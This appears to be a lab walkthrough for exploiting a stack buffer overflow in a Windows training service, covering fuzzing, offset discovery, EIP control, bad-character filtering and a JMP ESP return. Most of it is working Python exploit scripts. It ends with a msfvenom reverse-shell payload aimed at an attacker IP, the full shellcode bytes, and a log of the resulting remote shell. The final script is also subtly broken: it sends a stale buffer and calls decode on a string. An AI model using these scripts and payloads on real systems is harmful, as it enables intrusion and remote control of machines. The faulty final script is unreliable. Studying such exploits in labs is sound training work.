# Buffer Overflow 
### Steps
- Fuzzing
-  Finding the Offset
-  Overwriting the EIP
-  Finding Bad Characters
-  Finding the JMP ESP address
-  Exploiting the System



*Config Mona*
which will speedup exploit development by detect bad char and find offset in binary.

```
!mona config -set workingfolder c:\mona\%p
```




**`Fuzzing`**

```python
import socket
import sys

ip='10.10.52.133'
port=1337

payload="OVERFLOW1 "

buff=payload+"A"*100

while True:
    try:
        so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        so.connect((ip,port))
        so.recv(1024)
        print("Fuzzing {} bytes".format(len(buff)-len(payload)))
        so.send(bytes(buff,"latin-1"))
        so.recv(1024)
    except:
        print("crach {} bytes ".format(len(buff)-len(payload)))
        sys.exit(0)
    buff+="A"*100


```


![alt text](https://github.com/cyberheartmi9/Learn-Resource/blob/main/Buff/screenshots/1.png)




- crash Replication

```python
import socket
import sys

ip='10.10.52.133'
port=1337

payload="OVERFLOW1 "

buff=payload+"A"*2000


so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.connect((ip,port))
so.recv(1024)
print("Fuzzing {} bytes".format(len(buff)-len(payload)))
so.send(bytes(buff,"latin-1"))
so.recv(1024)

print("Exploit Done")
```




**`Finding the Offset`**


use pattern_create to create 2000 random chars.

```bash
┌──(root㉿debian)-[~]
└─# `locate pattern_create` -l 2000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co



```

update exploit script

```python

import socket
import sys

ip='10.10.52.133'
port=1337

payload="OVERFLOW1 "

buff=payload+"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"


so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.connect((ip,port))
so.recv(1024)
print("Fuzzing {} bytes".format(len(buff)-len(payload)))
so.send(bytes(buff,"latin-1"))
so.recv(1024)

print("Exploit Done")


```


![alt text](https://github.com/cyberheartmi9/Learn-Resource/blob/main/Buff/screenshots/2.png)


crash address in `EIP 6F43396E` 

use pattern_offset to find which bytes that could make program crash.

```bash
┌──(root㉿debian)-[~]
└─# `locate pattern_offset` -l 2000  -q  6F43396E
[*] Exact match at offset 1978
```




**`Overwriting the EIP`**

after find eip offset where eip overwrite with next 4 bytes , next steps will check if we have control on eip address by add `BBBB`


```python
import socket
import sys

ip='10.10.52.133'
port=1337

payload="OVERFLOW1 "

shellcode=3000

EIP="BBBB"
buff=payload+"A"*1978+EIP
bof=buff+'C'*(shellcode-len(buff))

#[padd][EIP][Shellcode]

so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.connect((ip,port))
so.recv(1024)
so.send(bytes(bof,"latin-1"))
so.recv(1024)

print("Exploit Done")

```

stack layout look like `[Padd=AAA's][EIP=BBBB][shellcode=C's]`


![alt text](https://github.com/cyberheartmi9/Learn-Resource/blob/main/Buff/screenshots/3.png)



**`Finding Bad Characters`**

to find bad char we go to generate bytes of array in hex begin with `\x00` end with `\xff` 

`bad.py`

```python
for x in range(0, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

```bash
┌──(root㉿debian)-[~]
└─# python bad.py
\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

```



- generate byteofarray.bin using `mona`

`!mona bytearray`

![alt text](https://github.com/cyberheartmi9/Learn-Resource/blob/main/Buff/screenshots/5.png)




```python

import socket
import sys

ip='10.10.52.133'
port=1337

payload="OVERFLOW1 "

shellcode=("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

EIP="BBBB"
buff=payload+"A"*1978+EIP
bof=buff+shellcode

#[padd][EIP][Shellcode]


so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.connect((ip,port))
so.recv(1024)
so.send(bytes(bof,"latin-1"))
so.recv(1024)

print("Exploit Done")



```


- compare byte of array in mona folder with what in stack by using `ESP 0185FA30` pointer.


![alt text](https://github.com/cyberheartmi9/Learn-Resource/blob/main/Buff/screenshots/6.png)



```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0185FA30
```

- filter out bad char `!mona bytearray -b '\x00'` and remove it from Exploit script and send it again.

- TIPs
add 4 bytes random `DDDD` after bad char which will help you when detect they no bad char that end string like `\x00` 

![alt text](https://github.com/cyberheartmi9/Learn-Resource/blob/main/Buff/screenshots/7.png)



**`Finding the JMP ESP address`**

`!mona jmp -r esp -cpb "\x00"`



![alt text](https://github.com/cyberheartmi9/Learn-Resource/blob/main/Buff/screenshots/8.png)



address will write in backward `1234` in exploit will be `\x4\x3\x2\x1`  (little endian)

after replace `BB's` with `jmp esp` address will add fake shellcode to ensure that we hit it.
`\xcc` INT3 interrupt handler which will pause program


```python

import socket
import sys

ip='10.10.52.133'
port=1337

payload="OVERFLOW1 "

shellcode="\xcc"*1000

#badchar \x00\x07\x2e\xa0


#JMP ESP
#0x 62 50 11 af



EIP="\xaf\x11\x50\x62"
buff=payload+"A"*1978+EIP
bof=buff+shellcode+"DDDD"

#[padd][EIP][Shellcode]


so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.connect((ip,port))
so.recv(1024)
so.send(bytes(bof,"latin-1"))
so.recv(1024)

print("Exploit Done")



```



![alt text](https://github.com/cyberheartmi9/Learn-Resource/blob/main/Buff/screenshots/9.png)



**` Exploiting the System`**
- generate shellcode using metasploit

`msfvenom -p windows/shell_reverse_tcp LHOST=10.9.172.138 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f python  
`

- TIPS

in order to write reliable exploit that work in different OS that could have small change in jmp esp which crash your exploit but you can add no operation (NOP) instruction before shellcode to ensure that you have pad that can help you to hit shellcode.
nop does't do any operation .

`\x90`-> nop

```python
import socket
import sys

ip='10.10.52.133'
port=1337

payload="OVERFLOW1 "


shellcode=("\xda\xc3\xbe\x0f\x18\x6e\x9f\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x31\x75\x17\x83\xed\xfc\x03\x7a\x0b\x8c\x6a\x78\xc3\xd2"
"\x95\x80\x14\xb3\x1c\x65\x25\xf3\x7b\xee\x16\xc3\x08\xa2\x9a"
"\xa8\x5d\x56\x28\xdc\x49\x59\x99\x6b\xac\x54\x1a\xc7\x8c\xf7"
"\x98\x1a\xc1\xd7\xa1\xd4\x14\x16\xe5\x09\xd4\x4a\xbe\x46\x4b"
"\x7a\xcb\x13\x50\xf1\x87\xb2\xd0\xe6\x50\xb4\xf1\xb9\xeb\xef"
"\xd1\x38\x3f\x84\x5b\x22\x5c\xa1\x12\xd9\x96\x5d\xa5\x0b\xe7"
"\x9e\x0a\x72\xc7\x6c\x52\xb3\xe0\x8e\x21\xcd\x12\x32\x32\x0a"
"\x68\xe8\xb7\x88\xca\x7b\x6f\x74\xea\xa8\xf6\xff\xe0\x05\x7c"
"\xa7\xe4\x98\x51\xdc\x11\x10\x54\x32\x90\x62\x73\x96\xf8\x31"
"\x1a\x8f\xa4\x94\x23\xcf\x06\x48\x86\x84\xab\x9d\xbb\xc7\xa3"
"\x52\xf6\xf7\x33\xfd\x81\x84\x01\xa2\x39\x02\x2a\x2b\xe4\xd5"
"\x4d\x06\x50\x49\xb0\xa9\xa1\x40\x77\xfd\xf1\xfa\x5e\x7e\x9a"
"\xfa\x5f\xab\x0d\xaa\xcf\x04\xee\x1a\xb0\xf4\x86\x70\x3f\x2a"
"\xb6\x7b\x95\x43\x5d\x86\x7e\x66\xab\x24\xf4\x1e\xa9\x34\x18"
"\x83\x24\xd2\x70\x2b\x61\x4d\xed\xd2\x28\x05\x8c\x1b\xe7\x60"
"\x8e\x90\x04\x95\x41\x51\x60\x85\x36\x91\x3f\xf7\x91\xae\x95"
"\x9f\x7e\x3c\x72\x5f\x08\x5d\x2d\x08\x5d\x93\x24\xdc\x73\x8a"
"\x9e\xc2\x89\x4a\xd8\x46\x56\xaf\xe7\x47\x1b\x8b\xc3\x57\xe5"
"\x14\x48\x03\xb9\x42\x06\xfd\x7f\x3d\xe8\x57\xd6\x92\xa2\x3f"
"\xaf\xd8\x74\x39\xb0\x34\x03\xa5\x01\xe1\x52\xda\xae\x65\x53"
"\xa3\xd2\x15\x9c\x7e\x57\x35\x7f\xaa\xa2\xde\x26\x3f\x0f\x83"
"\xd8\xea\x4c\xba\x5a\x1e\x2d\x39\x42\x6b\x28\x05\xc4\x80\x40"
"\x16\xa1\xa6\xf7\x17\xe0")
#badchar \x00\x07\x2e\xa0


#JMP ESP
#0x 62 50 11 af

nop="\x90"*20

EIP="\xaf\x11\x50\x62"
shellcodef=payload+"A"*1978+EIP
bof=buff+nop+shellcode.decode("utf-8")




#[padd][EIP][Shellcode]


so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.connect((ip,port))
so.recv(1024)
so.send(bytes(bof,"latin-1"))
so.recv(1024)

print("Exploit Done")


```





```
┌──(root㉿debian)-[~]
└─# nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444


Ncat: Connection from 10.10.52.133.
Ncat: Connection from 10.10.52.133:49287.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>
C:\Users\admin\Desktop\vulnerable-apps\oscp>
C:\Users\admin\Desktop\vulnerable-apps\oscp>whoami
whoami
oscp-bof-prep\admin

C:\Users\admin\Desktop\vulnerable-apps\oscp>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::c4f5:c92b:3ba0:1b10%16
   IPv4 Address. . . . . . . . . . . : 10.10.52.133
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal

C:\Users\admin\Desktop\vulnerable-apps\oscp>



```





#### Resource
- [Pentest-Cheatsheets/buffer-overflows.rst at master · Tib3rius/Pentest-Cheatsheets (github.com)](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)

